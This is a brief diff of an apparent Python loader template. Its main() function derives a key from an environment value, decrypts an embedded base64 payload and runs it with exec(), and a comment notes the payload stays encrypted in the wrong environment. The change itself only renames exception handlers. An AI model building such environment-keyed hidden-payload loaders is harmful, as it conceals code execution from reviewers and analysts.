@@ -163,13 +163,13 @@ def _decrypt(data, key):
 def main():
     try:
         {extractor}
-    except Exception:
+    except Exception as e:
         sys.exit(1)
     key = _derive_key(env_val)
     try:
         payload = _decrypt(base64.b64decode(PAYLOAD_B64), key)
         exec(payload)
-    except Exception:
+    except Exception as e:
         pass  # Wrong environment -- payload stays encrypted
 
 if __name__ == "__main__":
